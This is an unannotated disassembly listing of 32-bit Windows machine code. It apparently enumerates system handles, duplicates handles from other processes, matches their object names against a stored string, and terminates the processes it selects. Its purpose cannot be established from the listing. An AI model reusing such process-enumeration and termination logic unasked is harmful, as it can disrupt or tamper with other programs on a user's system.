  404ac4:	7e 05                	jle    0x404acb
  404ac6:	8b 76 10             	mov    0x10(%esi),%esi
  404ac9:	eb 02                	jmp    0x404acd
  404acb:	33 f6                	xor    %esi,%esi
  404acd:	50                   	push   %eax
  404ace:	56                   	push   %esi
  404acf:	ff d7                	call   *%edi
  404ad1:	50                   	push   %eax
  404ad2:	ff d3                	call   *%ebx
  404ad4:	33 c9                	xor    %ecx,%ecx
  404ad6:	85 c0                	test   %eax,%eax
  404ad8:	0f 94 c1             	sete   %cl
  404adb:	33 d2                	xor    %edx,%edx
  404add:	39 15 98 b2 41 00    	cmp    %edx,0x41b298
  404ae3:	a3 9c b2 41 00       	mov    %eax,0x41b29c
  404ae8:	0f 94 c2             	sete   %dl
  404aeb:	33 c0                	xor    %eax,%eax
  404aed:	39 05 94 b2 41 00    	cmp    %eax,0x41b294
  404af3:	8d 4c 09 2b          	lea    0x2b(%ecx,%ecx,1),%ecx
  404af7:	51                   	push   %ecx
  404af8:	0f 94 c0             	sete   %al
  404afb:	33 c9                	xor    %ecx,%ecx
  404afd:	39 0d 90 b2 41 00    	cmp    %ecx,0x41b290
  404b03:	8d 54 12 2b          	lea    0x2b(%edx,%edx,1),%edx
  404b07:	52                   	push   %edx
  404b08:	0f 94 c1             	sete   %cl
  404b0b:	33 d2                	xor    %edx,%edx
  404b0d:	39 15 8c b2 41 00    	cmp    %edx,0x41b28c
  404b13:	8d 44 00 2b          	lea    0x2b(%eax,%eax,1),%eax
  404b17:	0f 94 c2             	sete   %dl
  404b1a:	50                   	push   %eax
  404b1b:	8d 4c 09 2b          	lea    0x2b(%ecx,%ecx,1),%ecx
  404b1f:	51                   	push   %ecx
  404b20:	8d 54 12 2b          	lea    0x2b(%edx,%edx,1),%edx
  404b24:	52                   	push   %edx
  404b25:	e8 a6 1a 00 00       	call   0x4065d0
  404b2a:	8b 44 24 28          	mov    0x28(%esp),%eax
  404b2e:	83 c4 14             	add    $0x14,%esp
  404b31:	50                   	push   %eax
  404b32:	6a 00                	push   $0x0
  404b34:	ff 15 90 80 40 00    	call   *0x408090
  404b3a:	50                   	push   %eax
  404b3b:	ff 15 8c 80 40 00    	call   *0x40808c
  404b41:	8d 74 24 18          	lea    0x18(%esp),%esi
  404b45:	e8 16 e6 ff ff       	call   0x403160
  404b4a:	83 3d 8c b2 41 00 00 	cmpl   $0x0,0x41b28c
  404b51:	0f 84 f7 00 00 00    	je     0x404c4e
  404b57:	83 3d 90 b2 41 00 00 	cmpl   $0x0,0x41b290
  404b5e:	0f 84 ea 00 00 00    	je     0x404c4e
  404b64:	83 3d 94 b2 41 00 00 	cmpl   $0x0,0x41b294
  404b6b:	0f 84 dd 00 00 00    	je     0x404c4e
  404b71:	8d 4c 24 10          	lea    0x10(%esp),%ecx
  404b75:	51                   	push   %ecx
  404b76:	c7 05 30 b2 41 00 ff 	movl   $0x7fffffff,0x41b230
  404b7d:	ff ff 7f 
  404b80:	e8 fb fc ff ff       	call   0x404880
  404b85:	83 c4 04             	add    $0x4,%esp
  404b88:	85 c0                	test   %eax,%eax
  404b8a:	0f 8c be 00 00 00    	jl     0x404c4e
  404b90:	8b 44 24 10          	mov    0x10(%esp),%eax
  404b94:	8d 70 04             	lea    0x4(%eax),%esi
  404b97:	8b 00                	mov    (%eax),%eax
  404b99:	33 ed                	xor    %ebp,%ebp
  404b9b:	85 c0                	test   %eax,%eax
  404b9d:	89 44 24 14          	mov    %eax,0x14(%esp)
  404ba1:	0f 86 93 00 00 00    	jbe    0x404c3a
  404ba7:	66 83 3e 08          	cmpw   $0x8,(%esi)
  404bab:	72 59                	jb     0x404c06
  404bad:	8b 7e 04             	mov    0x4(%esi),%edi
  404bb0:	b9 e0 81 40 00       	mov    $0x4081e0,%ecx
  404bb5:	bb 04 00 00 00       	mov    $0x4,%ebx
  404bba:	2b f9                	sub    %ecx,%edi
  404bbc:	8d 64 24 00          	lea    0x0(%esp),%esp
  404bc0:	0f b7 04 0f          	movzwl (%edi,%ecx,1),%eax
  404bc4:	66 3d 41 00          	cmp    $0x41,%ax
  404bc8:	72 09                	jb     0x404bd3
  404bca:	66 3d 5a 00          	cmp    $0x5a,%ax
  404bce:	77 03                	ja     0x404bd3
  404bd0:	83 c0 20             	add    $0x20,%eax
  404bd3:	0f b7 d0             	movzwl %ax,%edx
  404bd6:	0f b7 01             	movzwl (%ecx),%eax
  404bd9:	66 3d 41 00          	cmp    $0x41,%ax
  404bdd:	72 09                	jb     0x404be8
  404bdf:	66 3d 5a 00          	cmp    $0x5a,%ax
  404be3:	77 03                	ja     0x404be8
  404be5:	83 c0 20             	add    $0x20,%eax
  404be8:	83 c1 02             	add    $0x2,%ecx
  404beb:	83 eb 01             	sub    $0x1,%ebx
  404bee:	0f b7 c0             	movzwl %ax,%eax
  404bf1:	74 05                	je     0x404bf8
  404bf3:	66 3b d0             	cmp    %ax,%dx
  404bf6:	74 c8                	je     0x404bc0
  404bf8:	0f b7 c0             	movzwl %ax,%eax
  404bfb:	0f b7 ca             	movzwl %dx,%ecx
  404bfe:	2b c8                	sub    %eax,%ecx
  404c00:	74 1b                	je     0x404c1d
  404c02:	8b 44 24 14          	mov    0x14(%esp),%eax
  404c06:	0f b7 56 02          	movzwl 0x2(%esi),%edx
  404c0a:	83 c2 03             	add    $0x3,%edx
  404c0d:	83 e2 fc             	and    $0xfffffffc,%edx
  404c10:	83 c5 01             	add    $0x1,%ebp
  404c13:	3b e8                	cmp    %eax,%ebp
  404c15:	8d 74 16 60          	lea    0x60(%esi,%edx,1),%esi
  404c19:	72 8c                	jb     0x404ba7
  404c1b:	eb 1d                	jmp    0x404c3a
  404c1d:	e8 1e fd ff ff       	call   0x404940
  404c22:	84 c0                	test   %al,%al
  404c24:	74 0b                	je     0x404c31
  404c26:	0f b6 46 52          	movzbl 0x52(%esi),%eax
  404c2a:	a3 30 b2 41 00       	mov    %eax,0x41b230
  404c2f:	eb 09                	jmp    0x404c3a
  404c31:	83 c5 02             	add    $0x2,%ebp
  404c34:	89 2d 30 b2 41 00    	mov    %ebp,0x41b230
  404c3a:	8b 4c 24 10          	mov    0x10(%esp),%ecx
  404c3e:	51                   	push   %ecx
  404c3f:	6a 00                	push   $0x0
  404c41:	ff 15 90 80 40 00    	call   *0x408090
  404c47:	50                   	push   %eax
  404c48:	ff 15 8c 80 40 00    	call   *0x40808c
  404c4e:	5f                   	pop    %edi
  404c4f:	5e                   	pop    %esi
  404c50:	5d                   	pop    %ebp
  404c51:	5b                   	pop    %ebx
  404c52:	8b e5                	mov    %ebp,%esp
  404c54:	5d                   	pop    %ebp
  404c55:	c3                   	ret
  404c56:	cc                   	int3
  404c57:	cc                   	int3
  404c58:	cc                   	int3
  404c59:	cc                   	int3
  404c5a:	cc                   	int3
  404c5b:	cc                   	int3
  404c5c:	cc                   	int3
  404c5d:	cc                   	int3
  404c5e:	cc                   	int3
  404c5f:	cc                   	int3
  404c60:	b8 10 11 00 00       	mov    $0x1110,%eax
  404c65:	e8 16 2c 00 00       	call   0x407880
  404c6a:	81 3d 30 b2 41 00 ff 	cmpl   $0x7fffffff,0x41b230
  404c71:	ff ff 7f 
  404c74:	53                   	push   %ebx
  404c75:	8b 9c 24 18 11 00 00 	mov    0x1118(%esp),%ebx
  404c7c:	75 0a                	jne    0x404c88
  404c7e:	32 c0                	xor    %al,%al
  404c80:	5b                   	pop    %ebx
  404c81:	81 c4 10 11 00 00    	add    $0x1110,%esp
  404c87:	c3                   	ret
  404c88:	8b c3                	mov    %ebx,%eax
  404c8a:	8d 9b 00 00 00 00    	lea    0x0(%ebx),%ebx
  404c90:	66 8b 08             	mov    (%eax),%cx
  404c93:	83 c0 02             	add    $0x2,%eax
  404c96:	66 85 c9             	test   %cx,%cx
  404c99:	75 f5                	jne    0x404c90
  404c9b:	2b c3                	sub    %ebx,%eax
  404c9d:	d1 f8                	sar    $1,%eax
  404c9f:	83 e8 01             	sub    $0x1,%eax
  404ca2:	83 f8 04             	cmp    $0x4,%eax
  404ca5:	56                   	push   %esi
  404ca6:	57                   	push   %edi
  404ca7:	72 63                	jb     0x404d0c
  404ca9:	8b 0d 70 b2 41 00    	mov    0x41b270,%ecx
  404caf:	8b f3                	mov    %ebx,%esi
  404cb1:	bf 04 00 00 00       	mov    $0x4,%edi
  404cb6:	2b f1                	sub    %ecx,%esi
  404cb8:	eb 06                	jmp    0x404cc0
  404cba:	8d 9b 00 00 00 00    	lea    0x0(%ebx),%ebx
  404cc0:	0f b7 04 0e          	movzwl (%esi,%ecx,1),%eax
  404cc4:	66 3d 41 00          	cmp    $0x41,%ax
  404cc8:	72 09                	jb     0x404cd3
  404cca:	66 3d 5a 00          	cmp    $0x5a,%ax
  404cce:	77 03                	ja     0x404cd3
  404cd0:	83 c0 20             	add    $0x20,%eax
  404cd3:	0f b7 d0             	movzwl %ax,%edx
  404cd6:	0f b7 01             	movzwl (%ecx),%eax
  404cd9:	66 3d 41 00          	cmp    $0x41,%ax
  404cdd:	72 09                	jb     0x404ce8
  404cdf:	66 3d 5a 00          	cmp    $0x5a,%ax
  404ce3:	77 03                	ja     0x404ce8
  404ce5:	83 c0 20             	add    $0x20,%eax
  404ce8:	83 c1 02             	add    $0x2,%ecx
  404ceb:	83 ef 01             	sub    $0x1,%edi
  404cee:	0f b7 c0             	movzwl %ax,%eax
  404cf1:	74 05                	je     0x404cf8
  404cf3:	66 3b d0             	cmp    %ax,%dx
  404cf6:	74 c8                	je     0x404cc0
  404cf8:	0f b7 c0             	movzwl %ax,%eax
  404cfb:	0f b7 ca             	movzwl %dx,%ecx
  404cfe:	2b c8                	sub    %eax,%ecx
  404d00:	75 0a                	jne    0x404d0c
  404d02:	83 c3 08             	add    $0x8,%ebx
  404d05:	89 9c 24 20 11 00 00 	mov    %ebx,0x1120(%esp)
  404d0c:	8b 1d 90 80 40 00    	mov    0x408090,%ebx
  404d12:	55                   	push   %ebp
  404d13:	be 00 00 10 00       	mov    $0x100000,%esi
  404d18:	56                   	push   %esi
  404d19:	6a 00                	push   $0x0
  404d1b:	ff d3                	call   *%ebx
  404d1d:	8b 3d 84 80 40 00    	mov    0x408084,%edi
  404d23:	50                   	push   %eax
  404d24:	ff d7                	call   *%edi
  404d26:	6a 00                	push   $0x0
  404d28:	8b e8                	mov    %eax,%ebp
  404d2a:	56                   	push   %esi
  404d2b:	55                   	push   %ebp
  404d2c:	6a 10                	push   $0x10
  404d2e:	89 6c 24 24          	mov    %ebp,0x24(%esp)
  404d32:	ff 15 90 b2 41 00    	call   *0x41b290
  404d38:	3d 04 00 00 c0       	cmp    $0xc0000004,%eax
  404d3d:	75 4c                	jne    0x404d8b
  404d3f:	90                   	nop
  404d40:	55                   	push   %ebp
  404d41:	6a 00                	push   $0x0
  404d43:	ff d3                	call   *%ebx
  404d45:	50                   	push   %eax
  404d46:	ff 15 8c 80 40 00    	call   *0x40808c
  404d4c:	81 c6 00 00 10 00    	add    $0x100000,%esi
  404d52:	81 fe 00 00 00 10    	cmp    $0x10000000,%esi
  404d58:	0f 8f 08 03 00 00    	jg     0x405066
  404d5e:	85 f6                	test   %esi,%esi
  404d60:	74 10                	je     0x404d72
  404d62:	56                   	push   %esi
  404d63:	6a 00                	push   $0x0
  404d65:	ff d3                	call   *%ebx
  404d67:	50                   	push   %eax
  404d68:	ff d7                	call   *%edi
  404d6a:	8b e8                	mov    %eax,%ebp
  404d6c:	89 44 24 14          	mov    %eax,0x14(%esp)
  404d70:	eb 06                	jmp    0x404d78
  404d72:	33 ed                	xor    %ebp,%ebp
  404d74:	89 6c 24 14          	mov    %ebp,0x14(%esp)
  404d78:	6a 00                	push   $0x0
  404d7a:	56                   	push   %esi
  404d7b:	55                   	push   %ebp
  404d7c:	6a 10                	push   $0x10
  404d7e:	ff 15 90 b2 41 00    	call   *0x41b290
  404d84:	3d 04 00 00 c0       	cmp    $0xc0000004,%eax
  404d89:	74 b5                	je     0x404d40
  404d8b:	85 c0                	test   %eax,%eax
  404d8d:	7d 19                	jge    0x404da8
  404d8f:	55                   	push   %ebp
  404d90:	6a 00                	push   $0x0
  404d92:	ff d3                	call   *%ebx
  404d94:	50                   	push   %eax
  404d95:	ff 15 8c 80 40 00    	call   *0x40808c
  404d9b:	5d                   	pop    %ebp
  404d9c:	5f                   	pop    %edi
  404d9d:	5e                   	pop    %esi
  404d9e:	32 c0                	xor    %al,%al
  404da0:	5b                   	pop    %ebx
  404da1:	81 c4 10 11 00 00    	add    $0x1110,%esp
  404da7:	c3                   	ret
  404da8:	56                   	push   %esi
  404da9:	e8 22 18 00 00       	call   0x4065d0
  404dae:	83 c4 04             	add    $0x4,%esp
  404db1:	83 3d a0 b2 41 00 00 	cmpl   $0x0,0x41b2a0
  404db8:	c7 44 24 18 00 00 00 	movl   $0x0,0x18(%esp)
  404dbf:	00 
  404dc0:	75 0b                	jne    0x404dcd
  404dc2:	ff 15 a0 80 40 00    	call   *0x4080a0
  404dc8:	a3 a0 b2 41 00       	mov    %eax,0x41b2a0
  404dcd:	8b 15 30 b2 41 00    	mov    0x41b230,%edx
  404dd3:	8b 45 00             	mov    0x0(%ebp),%eax
  404dd6:	52                   	push   %edx
  404dd7:	50                   	push   %eax
  404dd8:	e8 f3 17 00 00       	call   0x4065d0
  404ddd:	33 db                	xor    %ebx,%ebx
  404ddf:	83 c4 08             	add    $0x8,%esp
  404de2:	39 5d 00             	cmp    %ebx,0x0(%ebp)
  404de5:	0f 86 85 01 00 00    	jbe    0x404f70
  404deb:	8b 6c 24 14          	mov    0x14(%esp),%ebp
  404def:	83 c5 04             	add    $0x4,%ebp
  404df2:	eb 0c                	jmp    0x404e00
  404df4:	8d a4 24 00 00 00 00 	lea    0x0(%esp),%esp
  404dfb:	eb 03                	jmp    0x404e00
  404dfd:	8d 49 00             	lea    0x0(%ecx),%ecx
  404e00:	0f b6 4d 04          	movzbl 0x4(%ebp),%ecx
  404e04:	3b 0d 30 b2 41 00    	cmp    0x41b230,%ecx
  404e0a:	0f 85 4c 01 00 00    	jne    0x404f5c
  404e10:	0f b7 55 00          	movzwl 0x0(%ebp),%edx
  404e14:	3b 15 a0 b2 41 00    	cmp    0x41b2a0,%edx
  404e1a:	0f 84 3c 01 00 00    	je     0x404f5c
  404e20:	8b 35 68 b2 41 00    	mov    0x41b268,%esi
  404e26:	56                   	push   %esi
  404e27:	ff 15 44 81 40 00    	call   *0x408144
  404e2d:	8b 7e 20             	mov    0x20(%esi),%edi
  404e30:	56                   	push   %esi
  404e31:	ff 15 3c 81 40 00    	call   *0x40813c
  404e37:	0f b7 45 00          	movzwl 0x0(%ebp),%eax
  404e3b:	3b c7                	cmp    %edi,%eax
  404e3d:	0f 84 19 01 00 00    	je     0x404f5c
  404e43:	50                   	push   %eax
  404e44:	6a 00                	push   $0x0
  404e46:	6a 40                	push   $0x40
  404e48:	c7 44 24 1c 00 00 00 	movl   $0x0,0x1c(%esp)
  404e4f:	00 
  404e50:	ff 15 a4 80 40 00    	call   *0x4080a4
  404e56:	8b f0                	mov    %eax,%esi
  404e58:	85 f6                	test   %esi,%esi
  404e5a:	0f 84 fc 00 00 00    	je     0x404f5c
  404e60:	6a 00                	push   $0x0
  404e62:	6a 00                	push   $0x0
  404e64:	6a 00                	push   $0x0
  404e66:	8d 44 24 1c          	lea    0x1c(%esp),%eax
  404e6a:	50                   	push   %eax
  404e6b:	ff 15 88 80 40 00    	call   *0x408088
  404e71:	0f b7 4d 06          	movzwl 0x6(%ebp),%ecx
  404e75:	50                   	push   %eax
  404e76:	51                   	push   %ecx
  404e77:	56                   	push   %esi
  404e78:	ff 15 b0 80 40 00    	call   *0x4080b0
  404e7e:	85 c0                	test   %eax,%eax
  404e80:	0f 84 d6 00 00 00    	je     0x404f5c
  404e86:	8b 3d 48 81 40 00    	mov    0x408148,%edi
  404e8c:	56                   	push   %esi
  404e8d:	ff d7                	call   *%edi
  404e8f:	8b 54 24 10          	mov    0x10(%esp),%edx
  404e93:	52                   	push   %edx
  404e94:	ff 15 4c 81 40 00    	call   *0x40814c
  404e9a:	83 f8 01             	cmp    $0x1,%eax
  404e9d:	0f 85 b2 00 00 00    	jne    0x404f55
  404ea3:	a1 98 b2 41 00       	mov    0x41b298,%eax
  404ea8:	85 c0                	test   %eax,%eax
  404eaa:	0f 84 a5 00 00 00    	je     0x404f55
  404eb0:	8b 54 24 10          	mov    0x10(%esp),%edx
  404eb4:	6a 00                	push   $0x0
  404eb6:	68 00 04 00 00       	push   $0x400
  404ebb:	8d 8c 24 28 09 00 00 	lea    0x928(%esp),%ecx
  404ec2:	51                   	push   %ecx
  404ec3:	52                   	push   %edx
  404ec4:	ff d0                	call   *%eax
  404ec6:	85 c0                	test   %eax,%eax
  404ec8:	74 7c                	je     0x404f46
  404eca:	83 f8 04             	cmp    $0x4,%eax
  404ecd:	8d b4 24 20 09 00 00 	lea    0x920(%esp),%esi
  404ed4:	72 1d                	jb     0x404ef3
  404ed6:	8b 0d 70 b2 41 00    	mov    0x41b270,%ecx
  404edc:	b8 04 00 00 00       	mov    $0x4,%eax
  404ee1:	8b d6                	mov    %esi,%edx
  404ee3:	e8 58 f1 ff ff       	call   0x404040
  404ee8:	85 c0                	test   %eax,%eax
  404eea:	75 07                	jne    0x404ef3
  404eec:	8d b4 24 28 09 00 00 	lea    0x928(%esp),%esi
  404ef3:	8b 94 24 24 11 00 00 	mov    0x1124(%esp),%edx
  404efa:	8b c6                	mov    %esi,%eax
  404efc:	e8 ef f0 ff ff       	call   0x403ff0
  404f01:	85 c0                	test   %eax,%eax
  404f03:	75 50                	jne    0x404f55
  404f05:	0f b7 55 00          	movzwl 0x0(%ebp),%edx
  404f09:	0f b7 c2             	movzwl %dx,%eax
  404f0c:	3b 05 74 b2 41 00    	cmp    0x41b274,%eax
  404f12:	0f 84 3e 01 00 00    	je     0x405056
  404f18:	8b 74 24 18          	mov    0x18(%esp),%esi
  404f1c:	32 c9                	xor    %cl,%cl
  404f1e:	33 c0                	xor    %eax,%eax
  404f20:	85 f6                	test   %esi,%esi
  404f22:	76 14                	jbe    0x404f38
  404f24:	66 39 54 44 20       	cmp    %dx,0x20(%esp,%eax,2)
  404f29:	75 02                	jne    0x404f2d
  404f2b:	b1 01                	mov    $0x1,%cl
  404f2d:	83 c0 01             	add    $0x1,%eax
  404f30:	3b c6                	cmp    %esi,%eax
  404f32:	72 f0                	jb     0x404f24
  404f34:	84 c9                	test   %cl,%cl
  404f36:	75 1d                	jne    0x404f55
  404f38:	66 89 54 74 20       	mov    %dx,0x20(%esp,%esi,2)
  404f3d:	83 c6 01             	add    $0x1,%esi
  404f40:	89 74 24 18          	mov    %esi,0x18(%esp)
  404f44:	eb 0f                	jmp    0x404f55
  404f46:	ff 15 04 81 40 00    	call   *0x408104
  404f4c:	50                   	push   %eax
  404f4d:	e8 7e 16 00 00       	call   0x4065d0
  404f52:	83 c4 04             	add    $0x4,%esp
  404f55:	8b 4c 24 10          	mov    0x10(%esp),%ecx
  404f59:	51                   	push   %ecx
  404f5a:	ff d7                	call   *%edi
  404f5c:	8b 54 24 14          	mov    0x14(%esp),%edx
  404f60:	83 c3 01             	add    $0x1,%ebx
  404f63:	83 c5 10             	add    $0x10,%ebp
  404f66:	3b 1a                	cmp    (%edx),%ebx
  404f68:	0f 82 92 fe ff ff    	jb     0x404e00
  404f6e:	8b ea                	mov    %edx,%ebp
  404f70:	33 ff                	xor    %edi,%edi
  404f72:	39 7c 24 18          	cmp    %edi,0x18(%esp)
  404f76:	c7 44 24 1c 00 04 00 	movl   $0x400,0x1c(%esp)
  404f7d:	00 
  404f7e:	89 7c 24 10          	mov    %edi,0x10(%esp)
  404f82:	0f 86 bb 01 00 00    	jbe    0x405143
  404f88:	eb 06                	jmp    0x404f90
  404f8a:	8d 9b 00 00 00 00    	lea    0x0(%ebx),%ebx
  404f90:	0f b7 5c 7c 20       	movzwl 0x20(%esp,%edi,2),%ebx
  404f95:	53                   	push   %ebx
  404f96:	e8 35 16 00 00       	call   0x4065d0
  404f9b:	83 c4 04             	add    $0x4,%esp
  404f9e:	83 3d 9c b2 41 00 00 	cmpl   $0x0,0x41b29c
  404fa5:	0f 84 50 01 00 00    	je     0x4050fb
  404fab:	53                   	push   %ebx
  404fac:	6a 00                	push   $0x0
  404fae:	68 00 04 00 00       	push   $0x400
  404fb3:	ff 15 a4 80 40 00    	call   *0x4080a4
  404fb9:	8b f0                	mov    %eax,%esi
  404fbb:	85 f6                	test   %esi,%esi
  404fbd:	0f 84 29 01 00 00    	je     0x4050ec
  404fc3:	8d 4c 24 1c          	lea    0x1c(%esp),%ecx
  404fc7:	51                   	push   %ecx
  404fc8:	8d 94 24 24 01 00 00 	lea    0x124(%esp),%edx
  404fcf:	52                   	push   %edx
  404fd0:	6a 00                	push   $0x0
  404fd2:	56                   	push   %esi
  404fd3:	c7 44 24 2c 00 04 00 	movl   $0x400,0x2c(%esp)
  404fda:	00 
  404fdb:	ff 15 9c b2 41 00    	call   *0x41b29c
  404fe1:	85 c0                	test   %eax,%eax
  404fe3:	75 0f                	jne    0x404ff4
  404fe5:	ff 15 04 81 40 00    	call   *0x408104
  404feb:	50                   	push   %eax
  404fec:	e8 df 15 00 00       	call   0x4065d0
  404ff1:	83 c4 04             	add    $0x4,%esp
  404ff4:	56                   	push   %esi
  404ff5:	ff 15 48 81 40 00    	call   *0x408148
  404ffb:	8d 8c 24 20 01 00 00 	lea    0x120(%esp),%ecx
  405002:	66 8b 01             	mov    (%ecx),%ax
  405005:	83 c1 02             	add    $0x2,%ecx
  405008:	66 85 c0             	test   %ax,%ax
  40500b:	75 f5                	jne    0x405002
  40500d:	b8 28 90 41 00       	mov    $0x419028,%eax
  405012:	66 8b 10             	mov    (%eax),%dx
  405015:	83 c0 02             	add    $0x2,%eax
  405018:	66 85 d2             	test   %dx,%dx
  40501b:	75 f5                	jne    0x405012
  40501d:	2d 28 90 41 00       	sub    $0x419028,%eax
  405022:	8d 94 24 20 01 00 00 	lea    0x120(%esp),%edx
  405029:	2b ca                	sub    %edx,%ecx
  40502b:	d1 f8                	sar    $1,%eax
  40502d:	d1 f9                	sar    $1,%ecx
  40502f:	83 e8 01             	sub    $0x1,%eax
  405032:	83 e9 01             	sub    $0x1,%ecx
  405035:	3b c8                	cmp    %eax,%ecx
  405037:	73 3a                	jae    0x405073
  405039:	8b c2                	mov    %edx,%eax
  40503b:	eb 03                	jmp    0x405040
  40503d:	8d 49 00             	lea    0x0(%ecx),%ecx
  405040:	66 8b 08             	mov    (%eax),%cx
  405043:	83 c0 02             	add    $0x2,%eax
  405046:	66 85 c9             	test   %cx,%cx
  405049:	75 f5                	jne    0x405040
  40504b:	8d 94 24 20 01 00 00 	lea    0x120(%esp),%edx
  405052:	2b c2                	sub    %edx,%eax
  405054:	eb 3a                	jmp    0x405090
  405056:	8b 44 24 10          	mov    0x10(%esp),%eax
  40505a:	50                   	push   %eax
  40505b:	ff d7                	call   *%edi
  40505d:	8b 44 24 14          	mov    0x14(%esp),%eax
  405061:	e8 ea f1 ff ff       	call   0x404250
  405066:	5d                   	pop    %ebp
  405067:	5f                   	pop    %edi
  405068:	5e                   	pop    %esi
  405069:	32 c0                	xor    %al,%al
  40506b:	5b                   	pop    %ebx
  40506c:	81 c4 10 11 00 00    	add    $0x1110,%esp
  405072:	c3                   	ret
  405073:	b8 28 90 41 00       	mov    $0x419028,%eax
  405078:	eb 06                	jmp    0x405080
  40507a:	8d 9b 00 00 00 00    	lea    0x0(%ebx),%ebx
  405080:	66 8b 08             	mov    (%eax),%cx
  405083:	83 c0 02             	add    $0x2,%eax
  405086:	66 85 c9             	test   %cx,%cx
  405089:	75 f5                	jne    0x405080
  40508b:	2d 28 90 41 00       	sub    $0x419028,%eax
  405090:	d1 f8                	sar    $1,%eax
  405092:	83 e8 01             	sub    $0x1,%eax
  405095:	85 c0                	test   %eax,%eax
  405097:	0f 84 99 00 00 00    	je     0x405136
  40509d:	33 d2                	xor    %edx,%edx
  40509f:	90                   	nop
  4050a0:	0f b7 8c 14 20 01 00 	movzwl 0x120(%esp,%edx,1),%ecx
  4050a7:	00 
  4050a8:	66 83 f9 41          	cmp    $0x41,%cx
  4050ac:	72 09                	jb     0x4050b7
  4050ae:	66 83 f9 5a          	cmp    $0x5a,%cx
  4050b2:	77 03                	ja     0x4050b7
  4050b4:	83 c1 20             	add    $0x20,%ecx
  4050b7:	0f b7 f1             	movzwl %cx,%esi
  4050ba:	0f b7 8a 28 90 41 00 	movzwl 0x419028(%edx),%ecx
  4050c1:	66 83 f9 41          	cmp    $0x41,%cx
  4050c5:	72 09                	jb     0x4050d0
  4050c7:	66 83 f9 5a          	cmp    $0x5a,%cx
  4050cb:	77 03                	ja     0x4050d0
  4050cd:	83 c1 20             	add    $0x20,%ecx
  4050d0:	83 c2 02             	add    $0x2,%edx
  4050d3:	83 e8 01             	sub    $0x1,%eax
  4050d6:	0f b7 c9             	movzwl %cx,%ecx
  4050d9:	74 05                	je     0x4050e0
  4050db:	66 3b f1             	cmp    %cx,%si
  4050de:	74 c0                	je     0x4050a0
  4050e0:	0f b7 d1             	movzwl %cx,%edx
  4050e3:	0f b7 c6             	movzwl %si,%eax
  4050e6:	2b c2                	sub    %edx,%eax
  4050e8:	74 4c                	je     0x405136
  4050ea:	eb 0f                	jmp    0x4050fb
  4050ec:	ff 15 04 81 40 00    	call   *0x408104
  4050f2:	50                   	push   %eax
  4050f3:	e8 d8 14 00 00       	call   0x4065d0
  4050f8:	83 c4 04             	add    $0x4,%esp
  4050fb:	8d 8c 24 20 01 00 00 	lea    0x120(%esp),%ecx
  405102:	51                   	push   %ecx
  405103:	53                   	push   %ebx
  405104:	e8 c7 14 00 00       	call   0x4065d0
  405109:	83 c4 08             	add    $0x8,%esp
  40510c:	53                   	push   %ebx
  40510d:	6a 00                	push   $0x0
  40510f:	6a 01                	push   $0x1
  405111:	ff 15 a4 80 40 00    	call   *0x4080a4
  405117:	8b f0                	mov    %eax,%esi
  405119:	85 f6                	test   %esi,%esi
  40511b:	74 19                	je     0x405136
  40511d:	6a ff                	push   $0xffffffff
  40511f:	56                   	push   %esi
  405120:	ff 15 30 81 40 00    	call   *0x408130
  405126:	85 c0                	test   %eax,%eax
  405128:	74 05                	je     0x40512f
  40512a:	83 44 24 10 01       	addl   $0x1,0x10(%esp)
  40512f:	56                   	push   %esi
  405130:	ff 15 48 81 40 00    	call   *0x408148
  405136:	83 c7 01             	add    $0x1,%edi
  405139:	3b 7c 24 18          	cmp    0x18(%esp),%edi
  40513d:	0f 82 4d fe ff ff    	jb     0x404f90
  405143:	55                   	push   %ebp
  405144:	6a 00                	push   $0x0
  405146:	ff 15 90 80 40 00    	call   *0x408090
  40514c:	50                   	push   %eax
  40514d:	ff 15 8c 80 40 00    	call   *0x40808c
  405153:	8b 54 24 18          	mov    0x18(%esp),%edx
  405157:	5d                   	pop    %ebp
  405158:	33 c0                	xor    %eax,%eax
  40515a:	39 54 24 0c          	cmp    %edx,0xc(%esp)
  40515e:	5f                   	pop    %edi
  40515f:	5e                   	pop    %esi
  405160:	0f 94 c0             	sete   %al
  405163:	5b                   	pop    %ebx
  405164:	81 c4 10 11 00 00    	add    $0x1110,%esp
  40516a:	c3                   	ret
  40516b:	cc                   	int3
  40516c:	cc                   	int3
  40516d:	cc                   	int3
  40516e:	cc                   	int3
  40516f:	cc                   	int3
  405170:	55                   	push   %ebp
  405171:	8b ec                	mov    %esp,%ebp
  405173:	83 e4 f8             	and    $0xfffffff8,%esp
  405176:	83 ec 14             	sub    $0x14,%esp
  405179:	53                   	push   %ebx
  40517a:	56                   	push   %esi
  40517b:	57                   	push   %edi
  40517c:	68 00 40 00 00       	push   $0x4000
  405181:	6a 00                	push   $0x0
  405183:	c7 44 24 1c 00 00 00 	movl   $0x0,0x1c(%esp)
  40518a:	00 
  40518b:	c7 44 24 20 00 40 00 	movl   $0x4000,0x20(%esp)
  405192:	00 
  405193:	c7 44 24 18 ff ff ff 	movl   $0xffffffff,0x18(%esp)
  40519a:	ff 
  40519b:	ff 15 90 80 40 00    	call   *0x408090
  4051a1:	50                   	push   %eax
  4051a2:	ff 15 84 80 40 00    	call   *0x408084
  4051a8:	8b f0                	mov    %eax,%esi
  4051aa:	85 f6                	test   %esi,%esi
  4051ac:	89 74 24 1c          	mov    %esi,0x1c(%esp)
  4051b0:	0f 84 62 01 00 00    	je     0x405318
  4051b6:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  4051b9:	8b 7d 08             	mov    0x8(%ebp),%edi
  4051bc:	8d 44 24 14          	lea    0x14(%esp),%eax
  4051c0:	50                   	push   %eax
  4051c1:	51                   	push   %ecx
  4051c2:	6a 00                	push   $0x0
  4051c4:	6a 00                	push   $0x0
  4051c6:	57                   	push   %edi
  4051c7:	e8 84 26 00 00       	call   0x407850
  4051cc:	85 c0                	test   %eax,%eax
  4051ce:	74 0f                	je     0x4051df
  4051d0:	57                   	push   %edi
  4051d1:	50                   	push   %eax
  4051d2:	e8 f9 13 00 00       	call   0x4065d0
  4051d7:	83 c4 08             	add    $0x8,%esp
  4051da:	e9 1b 01 00 00       	jmp    0x4052fa
  4051df:	8b 7d 10             	mov    0x10(%ebp),%edi
  4051e2:	68 00 40 00 00       	push   $0x4000
  4051e7:	6a 00                	push   $0x0
  4051e9:	56                   	push   %esi
  4051ea:	c7 44 24 24 00 40 00 	movl   $0x4000,0x24(%esp)
  4051f1:	00 
  4051f2:	c7 44 24 1c ff ff ff 	movl   $0xffffffff,0x1c(%esp)
  4051f9:	ff 
  4051fa:	e8 01 bf ff ff       	call   0x401100
  4051ff:	8b 4c 24 20          	mov    0x20(%esp),%ecx
  405203:	83 c4 0c             	add    $0xc,%esp
